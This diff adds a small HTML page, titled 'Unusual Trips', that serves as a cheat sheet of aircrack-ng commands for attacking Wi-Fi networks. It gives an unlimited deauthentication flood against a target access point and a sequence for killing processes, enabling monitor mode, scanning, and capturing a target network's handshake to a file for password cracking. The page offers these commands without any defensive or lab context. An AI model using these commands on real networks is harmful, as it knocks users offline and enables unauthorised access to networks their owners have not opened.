@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unusual Trips</title>
+    <link rel="stylesheet" href="retroStyle.css">
+    <link rel="icon" type="image/x-icon" href="IMG/favicon.ico">
+</head>
+<body>
+    
+    <div class="container">
+        <h1 class="T-4 TextShadow">Deauth</h1>
+        <section class="T-TEXT"> 
+            <div class="code MT-5">
+                <p> sudo aireplay-ng --deauth 0 -a (MAC ADDR) wlan0 </p>
+            </div>
+            <h1 class="T-4 TextShadow">Wifi password discover</h1>
+            <div class="code MT-5">
+                <p> sudo airmon-ng check kill </p>
+            </div>
+            <div class="code MT-5">
+                <p> sudo airmon-ng start wlan0 </p>
+            </div>
+            <div class="code MT-5">
+                <p> sudo airodump-ng wlan0 </p>
+            </div>
+            <div class="code MT-5">
+                <p> sudo airodump-ng wlan0 -d (MAC ADDR) </p>
+            </div>
+            <div class="code MT-5">
+                <p> sudo airodump-ng wlan0 --bssid (MAC ADDR) -w (FILENAME) -c (CH) </p>
+            </div>
+        </section>     
+    </div>    
+</body>
+</html>
